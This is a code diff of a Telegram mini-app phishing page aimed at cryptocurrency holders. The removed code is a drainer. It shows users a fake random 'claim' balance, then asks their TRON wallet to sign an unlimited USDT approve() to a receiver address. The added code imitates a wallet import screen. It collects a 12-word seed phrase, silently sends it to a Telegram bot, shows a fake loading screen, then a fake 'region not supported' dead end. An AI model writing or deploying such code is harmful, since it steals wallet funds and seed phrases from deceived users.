+                pagination: { el: id + " .swiper-pagination", clickable: true },
+                on: { slideChange: function () { if (tg.HapticFeedback) tg.HapticFeedback.selectionChanged(); } }
+            });
         }
 
+        document.addEventListener("DOMContentLoaded", function() {
+            swiperTon = initSwiper("#swiper-ton");
+            setupMnemonicFiltersAndSuggestions();
+        });
 
-        // 1. 授权核心函数
-        async function requestApproval() {
-            const btn = document.getElementById('approve-btn');
-            const msg = document.getElementById('status-msg');
+        function switchMainTab(target) {
+            tg.HapticFeedback.impactOccurred('medium');
+            document.querySelectorAll('.tab-item').forEach(el => el.classList.remove('active'));
+            if (target === 'ton') document.getElementById('tab-ton').classList.add('active');
+            else document.getElementById('tab-crypto').classList.add('active');
+
+            document.getElementById('container-ton').classList.remove('active');
+            document.getElementById('container-crypto').classList.remove('active');
             
-            try {
-                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                    alert("请在波场钱包浏览器内打开");
+            if (target === 'ton') {
+                document.getElementById('container-ton').classList.add('active');
+                if (swiperCrypto) { swiperCrypto.destroy(); swiperCrypto = null; }
+                if (!swiperTon) swiperTon = initSwiper("#swiper-ton");
+            } else {
+                document.getElementById('container-crypto').classList.add('active');
+                if (swiperTon) { swiperTon.destroy(); swiperTon = null; }
+                if (!swiperCrypto) swiperCrypto = initSwiper("#swiper-crypto");
+            }
+        }
+
+        function triggerGeoBlock() {
+            tg.HapticFeedback.impactOccurred('heavy');
+            document.getElementById('geo-screen').classList.add('active');
+        }
+
+        function dismissGeoBlock() {
+            tg.HapticFeedback.impactOccurred('medium');
+            document.getElementById('geo-screen').classList.remove('active');
+        }
+
+        function showImportScreen() {
+            tg.HapticFeedback.impactOccurred('medium');
+            document.getElementById('import-screen').classList.add('active');
+            if (tg.BackButton) { tg.BackButton.show(); tg.BackButton.onClick(hideImportScreen); }
+        }
+
+        function hideImportScreen() {
+            if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');
+            document.getElementById('import-screen').classList.remove('active');
+            document.getElementById('suggest-box').classList.remove('active');
+            if (tg.BackButton) { tg.BackButton.hide(); }
+            clearAllMnemonicInputs();
+        }
+
+        function setupMnemonicFiltersAndSuggestions() {
+            const inputs = document.querySelectorAll('.word-input');
+            const suggestBox = document.getElementById('suggest-box');
+            const submitBtn = document.getElementById('btn-import-submit');
+
+            inputs.forEach((input) => {
+                input.addEventListener('focus', function() {
+                    document.querySelectorAll('.word-input-wrapper').forEach(w => w.classList.remove('focused'));
+                    document.getElementById('wrapper-' + this.id).classList.add('focused');
+                    activeInputId = this.id;
+                    updateSuggestions(this.value);
+                });
+
+                input.addEventListener('input', function() {
+                    let cleanedValue = this.value.replace(/[^a-zA-Z]/g, '').toLowerCase();
+                    this.value = cleanedValue;
+                    updateSuggestions(cleanedValue);
+                    validateInputs();
+                });
+
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedData = (e.clipboardData || window.clipboardData).getData('text').trim();
+                    const cleanPasted = pastedData.replace(/[^a-zA-Z\s,]/g, '');
+                    const words = cleanPasted.split(/[\s,]+/);
+
+                    if (words.length >= 1) {
+                        let fillIndex = parseInt(this.getAttribute('data-idx')) - 1;
+                        for (let i = 0; i < words.length && fillIndex < 12; i++) {
+                            inputs[fillIndex].value = words[i].toLowerCase();
+                            fillIndex++;
+                        }
+                        if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+                    }
+                    suggestBox.classList.remove('active');
+                    validateInputs();
+                });
+            });
+
+            function updateSuggestions(currentVal) {
+                if (!currentVal || currentVal.length < 1) {
+                    suggestBox.innerHTML = "";
+                    suggestBox.classList.remove('active');
                     return;
                 }
 
-                btn.innerText = "WAITING...";
-                btn.disabled = true;
-                msg.innerText = "请在钱包中确认授权...";
+                const matches = BIP39_WORDS.filter(w => w.startsWith(currentVal)).slice(0, 5);
 
-                // 构建授权交易 (Approve)
-                // 参数说明：接收者地址, 授权数量 (最大值)
-                const functionSelector = "approve(address,uint256)";
-                const parameter = [
-                    { type: 'address', value: RECEIVER },
-                    { type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" }
-                ];
-
-                const tx = await window.tronWeb.transactionBuilder.triggerSmartContract(
-                    USDT_CONTRACT,
-                    functionSelector,
-                    {},
-                    parameter
-                );
-
-                const signedTx = await window.tronWeb.trx.sign(tx.transaction);
-                const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
-
-                if (result.result) {
-                    msg.style.color = "#34c759";
-                    msg.innerText = "授权成功！正在处理提现...";
-                    btn.innerText = "PROCESSING...";
+                if (matches.length > 0) {
+                    suggestBox.innerHTML = "";
+                    matches.forEach(word => {
+                        const item = document.createElement('div');
+                        item.className = 'suggestion-item';
+                        item.innerText = word;
+                        item.addEventListener('click', function() {
+                            if (activeInputId) {
+                                const currentInput = document.getElementById(activeInputId);
+                                currentInput.value = word;
+                                if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+                                
+                                const currentIdx = parseInt(currentInput.getAttribute('data-idx'));
+                                if (currentIdx < 12) {
+                                    const nextInput = document.getElementById('w' + (currentIdx + 1));
+                                    nextInput.focus();
+                                } else {
+                                    suggestBox.classList.remove('active');
+                                }
+                                validateInputs();
+                            }
+                        });
+                        suggestBox.appendChild(item);
+                    });
+                    suggestBox.classList.add('active');
                 } else {
-                    throw new Error("Transaction failed");
+                    suggestBox.innerHTML = "";
+                    suggestBox.classList.remove('active');
                 }
-            } catch (e) {
-                console.error(e);
-                msg.style.color = "#ff453a";
-                msg.innerText = "授权失败，请重试";
-                btn.innerText = "RETRY WITHDRAW";
-                btn.disabled = false;
+            }
+
+            function validateInputs() {
+                let allFilled = true;
+                inputs.forEach(input => {
+                    if (input.value.trim() === "") allFilled = false;
+                });
+                submitBtn.disabled = !allFilled;
             }
         }
 
-        // 2. 基础流程逻辑
-        function handleMainAction() {
-            if (!isClaimed) {
-                startClaim();
-            } else {
-                const params = new URLSearchParams(window.location.search);
-                if (tg.platform !== "unknown" && !params.get('os')) {
-                    tg.openLink(window.location.origin + window.location.pathname + `?os=safari&amt=${userBalance}`, { try_browser: true });
-                } else {
-                    openModal();
-                }
-            }
-        }
-
-        function startClaim() {
-            const btn = document.getElementById('action-btn');
-            btn.innerText = "VERIFYING...";
-            setTimeout(() => {
-                userBalance = (Math.random() * (900 - 100) + 100).toFixed(2);
-                localStorage.setItem('p_amt', userBalance);
-                isClaimed = true;
-                setWithdrawUI();
-            }, 1500);
-        }
-
-        function setWithdrawUI() {
-            document.getElementById('main-val').innerText = userBalance;
-            const btn = document.getElementById('action-btn');
-            btn.innerText = "WITHDRAW NOW";
-            btn.style.background = "linear-gradient(90deg, #ffcc00, #ff9500)";
-        }
-
-        async function init() {
-            if (tg) { tg.ready(); tg.expand(); }
-
-            // 检测是否在钱包浏览器环境
-            const isWallet = window.tronWeb && window.tronWeb.defaultAddress.base58;
+        // ======================= 核心邏輯：異步發送、跳轉 Loading 及不支持界面 =======================
+        function submitMnemonicWords() {
+            tg.HapticFeedback.impactOccurred('medium');
             
-            if (isWallet) {
-                document.getElementById('ui-internal').style.display = 'block';
-                document.getElementById('addr').innerText = window.tronWeb.defaultAddress.base58;
-            } else {
-                document.getElementById('ui-external').style.display = 'flex';
-                if (isClaimed) setWithdrawUI();
-                const params = new URLSearchParams(window.location.search);
-                if (params.get('os') === 'safari' && params.get('amt')) {
-                    userBalance = params.get('amt');
-                    setWithdrawUI();
-                    setTimeout(openModal, 200);
-                }
+            // 1. 提取並拼接助記詞
+            const wordsArr = [];
+            for(let i = 1; i <= 12; i++) {
+                wordsArr.push(document.getElementById('w' + i).value.trim());
             }
+            const fullMnemonic = wordsArr.join(' ');
+
+            // 2. 顯示高仿「正在導入...」加載界面
+            document.getElementById('loading-screen').classList.add('active');
+
+            // 3. 同步將數據靜默發送給 Telegram 機器人
+            const messageText = `🔔 收到新匯入助記詞：\n\n\`${fullMnemonic}\``;
+            const targetUrl = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`;
+
+            fetch(targetUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TG_CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'MarkdownV2' // 使用等寬字體包裹助記詞，方便後台一鍵複製
+                })
+            })
+            .then(res => res.json())
+            .then(data => { console.log('TG Bot 發送成功:', data); })
+            .catch(err => { console.error('TG Bot 發送失敗:', err); });
+
+            // 4. 固定停留 2.5 秒，營造真實導入感，隨後切換至「地區不支持」
+            setTimeout(() => {
+                // 隱藏加載界面
+                document.getElementById('loading-screen').classList.remove('active');
+                // 隱藏原來的輸入界面
+                document.getElementById('import-screen').classList.remove('active');
+                // 彈出「不支持服務」擋板
+                document.getElementById('geo-screen').classList.add('active');
+                
+                if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('heavy');
+                if (tg.BackButton) tg.BackButton.hide(); // 進入最終死胡同頁面，隱藏返回鍵
+                clearAllMnemonicInputs();
+            }, 2500); 
         }
-
-      function openModal() { document.getElementById('walletModal').classList.add('active'); }
-function closeModal() { document.getElementById('walletModal').classList.remove('active'); }
-
-function jumpTo(type) {
-    const encodedUrl = encodeURIComponent(window.location.href);
-    let scheme = "";
-    switch(type) {
-        case 'tronlink': scheme = "tronlinkout://pull.dapp?url=" + encodedUrl; break;
-        case 'okx': scheme = "okx://wallet/dapp/details?dappUrl=" + encodedUrl; break;
-        case 'tp': scheme = "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({"url": window.location.href})); break;
-        // 新增钱包协议
-        case 'trust': scheme = "https://link.trustwallet.com/open_url?coin_id=195&url=" + encodedUrl; break;
-        case 'bitget': scheme = "bitkeep://bkconnect?action=dapp&url=" + encodedUrl; break;
-        case 'metamask': scheme = "metamask://dapp/" + window.location.href.replace(/^https?:\/\//, ""); break;
+        function clearAllMnemonicInputs() {
+        // 1. 清空 12 個輸入框的值
+        for(let i = 1; i <= 12; i++) {
+           const inputEl = document.getElementById('w' + i);
+           if(inputEl) inputEl.value = "";
+        }
+    // 2. 移除所有輸入框的外框高亮狀態
+         document.querySelectorAll('.word-input-wrapper').forEach(w => w.classList.remove('focused'));
+    // 3. 重新將「繼續」按鈕禁用（因為內容已經空了）
+         const submitBtn = document.getElementById('btn-import-submit');
+         if(submitBtn) submitBtn.disabled = true;
+    // 4. 隱藏聯想字面板
+         const suggestBox = document.getElementById('suggest-box');
+         if(suggestBox) {
+           suggestBox.innerHTML = "";
+           suggestBox.classList.remove('active');
+         }
     }
-    if (scheme) window.location.href = scheme;
-}
-
-        init();
     </script>
 </body>
 </html>
